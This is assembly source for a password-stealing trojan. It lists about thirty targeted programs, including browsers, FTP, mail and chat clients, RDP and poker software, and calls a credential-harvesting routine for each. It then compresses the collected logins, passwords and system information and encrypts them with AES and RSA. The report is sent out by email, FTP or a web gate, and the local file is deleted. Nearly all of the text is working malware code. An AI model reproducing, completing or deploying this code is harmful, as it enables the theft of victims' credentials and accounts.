      LIVE_STEAL                       equ   10h
      FILEZILLA_STEAL                  equ   11h
      FXP_STEAL                        equ   12h
      IE_STEAL                         equ   13h
      WTC_STEAL                        equ   14h
      OPERA_STEAL                      equ   15h
      PIDGIN_STEAL                     equ   16h
      GTALK_STEAL                      equ   17h
      QIPINFIUM_STEAL                  equ   18h
      MIRANDA_STEAL                    equ   19h
      FIREFOX_STEAL                    equ   1Ah
      MRA_STEAL                        equ   1Bh
      ICQ_STEAL                        equ   1Ch
      FAR_STEAL                        equ   1Dh
      THEBAT_STEAL                     equ   1Eh
      SMARTFTP_STEAL                   equ   1Fh
      CHROME_STEAL                     equ   21h
      QIP2005_STEAL                    equ   22h
      THUNDERBIRD_STEAL                equ   23h
      SAFARI_STEAL                     equ   24h
      PSI_STEAL                        equ   25h
      COREFTP_STEAL                    equ   27h
      WS_FTP_STEAL                     equ   28h
      RAS_STEAL                        equ   29h
      INCREDIMAIL_STEAL                equ   2Ch
      SEAMONKEY_STEAL                  equ   2Dh
      RDP_STEAL                        equ   35h
      ICQ8_STEAL                       equ   36h
      POKERSTARS_STEAL                 equ   37h
      FULLTILTPOKER_STEAL              equ   38h
      WINSCP_STEAL                     equ   39h
      SYSINFO_STEAL                    equ   99h
      
      UFR_MARK                         equ   21524655h ; "UFR!"
      UFR_REPORT_VER                   equ   03020000h ; 3.2.0.0
      
      ENCRYPT_AES                      equ   00000000h
      ENCRYPT_RSA                      equ   00000001h
      
      REPORT_DATA_BINARY               equ   10h ; byte
      REPORT_DATA_HOST                 equ   11h ; byte
      REPORT_DATA_LOGIN                equ   22h ; byte
      REPORT_DATA_PWD                  equ   33h ; byte
      REPORT_DATA_UKWN                 equ   44h ; byte
      REPORT_DATA_URL                  equ   55h ; byte
      REPORT_DATA_PROTOCOL             equ   66h ; byte
      REPORT_DATA_NAME                 equ   77h ; byte
      REPORT_DATA_RAS_AREA_CODE        equ   79h ; byte
      REPORT_DATA_RAS_NUMBER           equ   7Ah ; byte
      REPORT_DATA_SERVER               equ   7Ch ; byte
      REPORT_DATA_EMAIL                equ   7Dh ; byte
      REPORT_DATA_SYSINFO_IP           equ   66666666h ; dword
      REPORT_DATA_SYSINFO_PROCESS_MARK equ   77777777h ; dword
      REPORT_DATA_SYSINFO_USERS_MARK   equ   88888888h ; dword
      REPORT_DATA_SYSINFO_SOFT_MARK    equ   99999999h ; dword
      REPORT_FOLDER_WINDOWS            equ   01h ; byte
      REPORT_FOLDER_SYSTEM             equ   02h ; byte
      REPORT_FOLDER_TEMP               equ   03h ; byte
      REPORT_FOLDER_MYDOCS             equ   04h ; byte
      REPORT_FOLDER_PROGRAM            equ   05h ; byte
      REPORT_FOLDER_AUTORUN            equ   06h ; byte
      
      CALG_AES_256                     equ   00006610h
      
      ChromiumBasedScan                PROTO; :DWORD
      MozillaBasedScan                 PROTO :DWORD, :DWORD
      
WriteToLog proc from_data: DWORD, len_data:DWORD
      WriteFile, stfile, from_data, len_data, addr nw, 0
      ret
WriteToLog endp

StealPwds proc
      GetTempPath, sizeof StealTmpBuf1, addr StealTmpBuf1
      invoke  CreateRndString, addr buf5b, 4
      invoke  GenHWIDString
      lstrcat, addr StealTmpBuf1, addr report1
      lstrcat, addr StealTmpBuf1, addr UniqDirName
      lstrcat, addr StealTmpBuf1, addr strike
      lstrcat, addr StealTmpBuf1, addr ComputerHWID
      lstrcat, addr StealTmpBuf1, addr strike
      lstrcat, addr StealTmpBuf1, addr buf5b
      lstrcat, addr StealTmpBuf1, addr report2
      lstrcpy, addr StealTmpBuf2, addr StealTmpBuf1
      CreateFile, addr StealTmpBuf1, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL
      cmp     eax, INVALID_HANDLE_VALUE
      je      st_BadInput
      mov     dword ptr [stfile], eax
      
      mov     dword ptr [UsefulDataSize], 0
      
      call    GetWinSCPPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetFullTiltPokerPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetPokerStarsPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetICQ8Pwd
      add     dword ptr [UsefulDataSize], eax
      call    GetRDPPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetSeaMonkeyPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetIncrediMailPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetRASPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetWS_FTPPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetCoreFTPPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetPsiPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetSafariPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetThunderbirdPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetQIP2005Pwd
      add     dword ptr [UsefulDataSize], eax
      call    GetChromePwd
      add     dword ptr [UsefulDataSize], eax
      call    GetSmartFTPPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetTheBatPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetFARPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetICQPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetMRAPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetFirefoxPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetMirandaPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetInfiumPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetGTalkPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetOperaPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetLivePwd
      add     dword ptr [UsefulDataSize], eax
      call    GetFileZillaPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetFXPPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetIEPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetWTCPwd
      add     dword ptr [UsefulDataSize], eax
      call    GetPidginPwd
      add     dword ptr [UsefulDataSize], eax
      call    SaveSystemInfo
      
      CloseHandle, stfile
      
      ; Rename report.bin if needed (no PWDs has been stolen) and move new filename (StealTmpBuf2) info old filename-string (StealTmpBuf1)
      mov     eax, dword ptr [UsefulDataSize]
      .if     eax == 0
              push    offset StealTmpBuf2
              call    _PathFindFileName
              mov     byte ptr [eax], 0
              lstrcat, addr StealTmpBuf2, addr emtpy_bin_file_no_pwd
              push    offset StealTmpBuf1
              call    _PathFindFileName
              lstrcat, addr StealTmpBuf2, eax
              MoveFileEx, addr StealTmpBuf1, addr StealTmpBuf2, MOVEFILE_WRITE_THROUGH
              lstrcpy, addr StealTmpBuf1, addr StealTmpBuf2
      .endif
      
      call    PackReport
      
      call    EncryptReport
      
      lstrcpy, addr cpyfrom, addr StealTmpBuf1
      lstrcpy, addr cpyto, addr StealTmpBuf1
      
      lstrlen, addr mail_from
      .if     ( eax != 0 )
              pushad
              call    MAIL_SEND
              popad
      .endif
      lstrlen, addr FTP_HOST
      .if     ( eax != 0 )
              call    FTP_SEND
      .endif
      mov     eax, dword ptr [GateHostSize]
      .if     ( eax != 0 )
              call    GATE_SEND
      .endif
      mov     eax, dword ptr [DirNameCreateLen]
      .if     ( eax != 0 )
              lstrcpy, addr TmpBuf2, addr const_d
              lstrcat, addr TmpBuf2, addr sl
              push    offset StealTmpBuf1
              call    _PathFindFileName
              lstrcat, addr TmpBuf2, eax
              CopyFile, addr cpyfrom, addr TmpBuf2, FALSE
      .endif
      DeleteFile, addr cpyfrom
st_BadInput:
      ret
StealPwds endp

PackReport proc
      LOCAL   pSize      :DWORD
      LOCAL   pFile      :DWORD
      LOCAL   hmem_p     :DWORD
      LOCAL   hmem_p2    :DWORD
      LOCAL   CompSz     :DWORD
      LOCAL   FrWoSpSz   :DWORD
      LOCAL   BufWoSpSz  :DWORD
      CreateFile, addr StealTmpBuf1, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL
      cmp     eax, INVALID_HANDLE_VALUE
      je      pack_bad_input
      mov     dword ptr [pFile], eax
      GetFileSize, pFile, 0
      mov     pSize, eax

      VirtualAlloc, 0, pSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      pack_alloc_shit
      mov     hmem_p, eax
      VirtualAlloc, 0, pSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      pack_alloc_shit2
      mov     hmem_p2, eax
      
      ReadFile, pFile, hmem_p, pSize, addr nw, NULL
      SetFilePointer, pFile, 0, NULL, FILE_BEGIN
      SetEndOfFile, pFile
      
      lea     eax, FrWoSpSz
      push    eax
      lea     eax, BufWoSpSz
      push    eax
      push    COMPRESSION_FORMAT_LZNT1 or COMPRESSION_ENGINE_MAXIMUM
      call    dword ptr [_RtlGetCompressionWorkSpaceSize]
      ;-
      push    dword ptr [hmem_p2]
      ;-
      lea     eax, BufWoSpSz
      push    eax
      lea     eax, CompSz
      push    eax
      push    4096
      push    dword ptr [pSize]
      push    dword ptr [hmem_p2]
      push    dword ptr [pSize]
      push    dword ptr [hmem_p]
      push    COMPRESSION_FORMAT_LZNT1 or COMPRESSION_ENGINE_MAXIMUM
      call    dword ptr [_RtlCompressBuffer]
      ;-
      pop     dword ptr [hmem_p2]
      ;-
      WriteFile, pFile, hmem_p2, CompSz, addr nw, NULL
      WriteFile, pFile, addr pSize, sizeof pSize, addr nw, NULL
      
      VirtualFree, hmem_p2, pSize, MEM_DECOMMIT
pack_alloc_shit2:
      VirtualFree, hmem_p, pSize, MEM_DECOMMIT
pack_alloc_shit:
      CloseHandle, pFile
pack_bad_input:
      ret
PackReport endp

EncryptReport proc
      LOCAL   hmem_e :DWORD
      LOCAL   hSize :DWORD
      LOCAL   hAES_key :DWORD
      LOCAL   hProv :DWORD
      LOCAL   hKey_e :DWORD
      LOCAL   AES_key_len :DWORD
      LOCAL   align_shit :DWORD
      
      mov     dword ptr [align_shit], 0
      CreateFile, addr StealTmpBuf1, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL
      cmp     eax, INVALID_HANDLE_VALUE
      je      enc_bad_input
      mov     dword ptr [stfile], eax
      
      GetFileSize, stfile, 0
      mov     hSize, eax
      xor     edx, edx
      mov     ecx, 10h
      div     ecx
      .if     edx != 0
              mov     eax, 10h
              sub     eax, edx
              mov     dword ptr [align_shit], eax
              add     dword ptr [hSize], eax
      .endif
      
      VirtualAlloc, 0, hSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      alloc_shit
      mov     hmem_e, eax
      
      ReadFile, stfile, hmem_e, hSize, addr nw, NULL

; <encrypt>
      push    CRYPT_VERIFYCONTEXT
      push    PROV_RSA_AES
      push    0
      push    0
      lea     eax, hProv
      push    eax
      call    dword ptr [_CryptAcquireContext]
      test    eax, eax
      je      FatalError
      
      lea     eax, hKey_e
      push    eax
      push    01000000h or CRYPT_EXPORTABLE
      push    CALG_AES_256
      push    dword ptr [hProv]
      call    dword ptr [_CryptGenKey]
      test    eax, eax
      je      FatalError
      
      lea     eax, AES_key_len
      push    eax
      push    0
      push    0
      push    PLAINTEXTKEYBLOB
      push    0
      push    dword ptr [hKey_e]
      call    dword ptr [_CryptExportKey]
      test    eax, eax
      je      FatalError
      
      VirtualAlloc, 0, AES_key_len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      mov     dword ptr [hAES_key], eax
      
      lea     eax, AES_key_len
      push    eax
      push    dword ptr [hAES_key]
      push    0
      push    PLAINTEXTKEYBLOB
      push    0
      push    dword ptr [hKey_e]
      call    dword ptr [_CryptExportKey]
      test    eax, eax
      je      FatalError
      
      mov     eax, dword ptr [hSize]
      mov     dword ptr [nw], eax
      push    dword ptr [hSize]
      push    offset nw
      push    dword ptr [hmem_e]
      push    0
      push    FALSE
      push    0
      push    dword ptr [hKey_e]
      call    dword ptr [_CryptEncrypt]
      test    eax, eax
      je      FatalError
      
      push    dword ptr [hKey_e]
      call    dword ptr [_CryptDestroyKey]
      push    0
      push    dword ptr [hProv]
      call    dword ptr [_CryptReleaseContext]
; </encrypt>
      
      SetFilePointer, stfile, 0, 0, FILE_BEGIN
      SetEndOfFile, stfile
      
      mov     dword ptr [stbuf], UFR_MARK
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
      
      mov     dword ptr [stbuf], UFR_REPORT_VER
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
      
      invoke  crc32, hmem_e, hSize
      mov     dword ptr [stbuf], eax
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
      
      ; if AES then write KEY
      mov     eax, dword ptr [PwdKeySize]
      .if     eax == 0
      ; use AES
              ; write "using AES" mark
              mov     dword ptr [stbuf], ENCRYPT_AES
              WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
              ; write length(KEY)
              mov     eax, dword ptr [AES_key_len]
              mov     dword ptr [stbuf], eax
              WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
              ; write KEY
              WriteFile, stfile, hAES_key, AES_key_len, addr nw, NULL
      .else
      ; use AES & RSA
              ; write "using RSA" mark
              mov     dword ptr [stbuf], ENCRYPT_RSA
              WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
              ; move AES key into bigger buf
              RtlMoveMemory, addr PwdProtAESKeyEncryptBuf, hAES_key, AES_key_len
              ; RSA the AES KEY and write it
              push    CRYPT_VERIFYCONTEXT
              push    PROV_RSA_AES
              push    0
              push    0
              lea     eax, hProv
              push    eax
              call    dword ptr [_CryptAcquireContext]
              test    eax, eax
              je      FatalError
              
              lea     eax, hKey_e
              push    eax
              push    0
              push    0
              push    dword ptr [PwdKeySize]
              push    dword ptr [hPwdKeyMem]
              push    dword ptr [hProv]
              call    _CryptImportKey
              test    eax, eax
              je      FatalError
              
              push    sizeof PwdProtAESKeyEncryptBuf
              lea     eax, AES_key_len
              push    eax
              push    offset PwdProtAESKeyEncryptBuf
              push    0
              push    FALSE
              push    0
              push    dword ptr [hKey_e]
              call    dword ptr [_CryptEncrypt]
              test    eax, eax
              je      FatalError
              
              push    dword ptr [hKey_e]
              call    dword ptr [_CryptDestroyKey]
              push    0
              push    dword ptr [hProv]
              call    dword ptr [_CryptReleaseContext]
              ; write length(KEY)
              mov     eax, dword ptr [AES_key_len]
              mov     dword ptr [stbuf], eax
              WriteFile, stfile, addr stbuf, sizeof stbuf, addr nw, NULL
              ; write KEY
              WriteFile, stfile, addr PwdProtAESKeyEncryptBuf, AES_key_len, addr nw, NULL
      .endif
      
      WriteFile, stfile, hmem_e, hSize, addr nw, NULL
      WriteFile, stfile, addr align_shit, sizeof align_shit, addr nw, NULL
      
      VirtualFree, hmem_e, hSize, MEM_DECOMMIT
alloc_shit:
      CloseHandle, stfile
enc_bad_input:
      ret
EncryptReport endp

stealer_seh_proc proc C pExcept:DWORD, pFrame:DWORD, pContext:DWORD, pDispatch:DWORD
      lea     eax, seh
      push    (SEH PTR [eax]).SafeEip
      push    (SEH PTR [eax]).PrevEsp
      push    (SEH PTR [eax]).PrevEbp
      
      mov     eax, pContext
      pop     (CONTEXT PTR [eax]).regEbp
      pop     (CONTEXT PTR [eax]).regEsp
      pop     (CONTEXT PTR [eax]).regEip
      
      pushad
      SetFilePointer, stfile, savedfilepointer, 0, FILE_BEGIN
      SetEndOfFile, stfile
      popad
      
      mov     dword ptr [DataSize], 0
      
      xor     eax, eax
      ret
stealer_seh_proc endp
